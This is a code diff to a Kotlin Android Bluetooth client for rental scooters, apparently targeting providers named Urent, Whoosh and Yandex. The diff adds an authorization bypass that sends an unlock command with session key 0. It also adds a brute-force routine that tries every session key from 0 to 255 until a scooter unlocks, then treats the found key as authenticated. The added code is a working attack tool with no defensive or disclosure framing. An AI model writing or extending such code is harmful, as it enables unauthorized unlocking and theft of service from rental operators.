@@ -43,6 +43,7 @@ object ScooterClient : BleTransport.Listener {
     private const val WHOOSH_TAG = "WHOOSH"
     private const val YANDEX_TAG = "YANDEX"
     private const val PROVIDER_TAG = "PROVIDER"
+    private const val BYPASS_TAG = "BYPASS"
     private const val YANDEX_TIMEOUT_MS = 5000L
     private const val WHOOSH_KEY_TIMEOUT_MS = 3000L
 
@@ -72,6 +73,12 @@ object ScooterClient : BleTransport.Listener {
     private var unlockTimeout: Runnable? = null
     private var spamRunning = false
     private var spamRunnable: Runnable? = null
+    private var bypassPending = false
+    private var bypassKey = 0
+    private var bruteRunning = false
+    private var bruteKey = 0
+    private var bruteCurrent = -1
+    private var bruteRunnable: Runnable? = null
     private var reconnectAttempts = 0
     private var reconnectRunnable: Runnable? = null
     private var linkLost = true
@@ -129,6 +136,8 @@ object ScooterClient : BleTransport.Listener {
             ClientState.READY -> authenticated
             else -> false
         }
+
+    val hasLink: Boolean get() = isDemo || isConnected()
 
     fun init(context: Context) {
         if (transport == null) {
@@ -250,6 +259,8 @@ object ScooterClient : BleTransport.Listener {
         authTimeout?.let { handler.removeCallbacks(it) }
         authTimeout = null
         cancelUnlock()
+        stopKeyBrute()
+        bypassPending = false
         cancelWhoosh()
         cancelYandex()
         sessionKey = 0
@@ -305,6 +316,8 @@ object ScooterClient : BleTransport.Listener {
         authTimeout?.let { handler.removeCallbacks(it) }
         authTimeout = null
         cancelUnlock()
+        stopKeyBrute()
+        bypassPending = false
         cancelWhoosh()
         cancelYandex()
         rxBuffer = ByteArray(0)
@@ -496,6 +509,89 @@ object ScooterClient : BleTransport.Listener {
     fun sendService(cmd: Int, payload: ByteArray) {
         val key = requireKey() ?: return
         writeCommand(FrameCodec.build(cmd, key, payload), "сервис ${hexByte(cmd)}")
+    }
+
+    fun bypassUnlock() {
+        if (provider != Provider.URENT) {
+            LogBus.warn(TAG, "Обход доступен только для Urent")
+            return
+        }
+        if (!isConnected()) {
+            LogBus.warn(BYPASS_TAG, "Нет подключения")
+            return
+        }
+        cancelUnlock()
+        stopKeyBrute()
+        bypassPending = true
+        bypassKey = 0
+        LogBus.warn(BYPASS_TAG, "Unlock без авторизации, key 0")
+        writeFrame(ScooterCodec.unlockCommand(0), "unlock key 0")
+        handler.postDelayed({
+            if (bypassPending) {
+                writeFrame(ScooterCodec.unlockCommandTimestamp(0, System.currentTimeMillis()), "unlock key 0 timestamp")
+            }
+        }, 500)
+        handler.postDelayed({ bypassPending = false }, 3500)
+    }
+
+    fun startKeyBrute() {
+        if (provider != Provider.URENT) {
+            LogBus.warn(TAG, "Перебор доступен только для Urent")
+            return
+        }
+        if (!isConnected()) {
+            LogBus.warn(BYPASS_TAG, "Нет подключения")
+            return
+        }
+        if (bruteRunning) return
+        cancelUnlock()
+        bypassPending = false
+        bruteRunning = true
+        bruteKey = 0
+        bruteCurrent = -1
+        LogBus.warn(BYPASS_TAG, "Перебор session key 0..255")
+        val runnable = object : Runnable {
+            override fun run() {
+                if (!bruteRunning) return
+                if (!isConnected()) {
+                    stopKeyBrute()
+                    return
+                }
+                if (bruteKey > 0xFF) {
+                    stopKeyBrute()
+                    LogBus.warn(BYPASS_TAG, "Перебор завершен без успеха")
+                    return
+                }
+                bruteCurrent = bruteKey
+                val key = bruteKey
+                bruteKey += 1
+                writeFrame(ScooterCodec.unlockCommand(key), null)
+                if (key % 16 == 0) {
+                    LogBus.info(BYPASS_TAG, "Перебор: 0x${hexByte(key)}")
+                }
+                handler.postDelayed(this, 60)
+            }
+        }
+        bruteRunnable = runnable
+        handler.post(runnable)
+    }
+
+    fun stopKeyBrute() {
+        if (!bruteRunning) return
+        bruteRunning = false
+        bruteRunnable?.let { handler.removeCallbacks(it) }
+        bruteRunnable = null
+        bruteCurrent = -1
+        LogBus.info(BYPASS_TAG, "Перебор остановлен")
+    }
+
+    private fun acceptSessionKey(key: Int, message: String) {
+        sessionKey = key
+        authenticated = true
+        reconnectAttempts = 0
+        _state.value = ClientState.READY
+        LogBus.ok(BYPASS_TAG, message)
+        onAuthenticated()
     }
 
     fun startSpam() {
@@ -770,6 +866,8 @@ object ScooterClient : BleTransport.Listener {
         authTimeout?.let { handler.removeCallbacks(it) }
         authTimeout = null
         cancelUnlock()
+        stopKeyBrute()
+        bypassPending = false
         cancelWhoosh()
         cancelYandex()
         yandexSession = 0
@@ -1378,6 +1476,18 @@ object ScooterClient : BleTransport.Listener {
     private fun handleUnlockFrame(frame: ScooterFrame) {
         val ok = ScooterCodec.isLockStatusSuccess(frame.payload)
         reportLock(frame, "Самокат разблокирован", "Ошибка разблокировки")
+        if (ok && bruteRunning) {
+            val key = bruteCurrent
+            stopKeyBrute()
+            bypassPending = false
+            if (key >= 0) acceptSessionKey(key, "Перебор: подошел session key 0x${hexByte(key)}")
+            return
+        }
+        if (ok && bypassPending) {
+            bypassPending = false
+            acceptSessionKey(bypassKey, "Обход auth: unlock сработал, session key 0x${hexByte(bypassKey)}")
+            return
+        }
         if (unlockVariant < 0) return
         unlockTimeout?.let { handler.removeCallbacks(it) }
         unlockTimeout = null
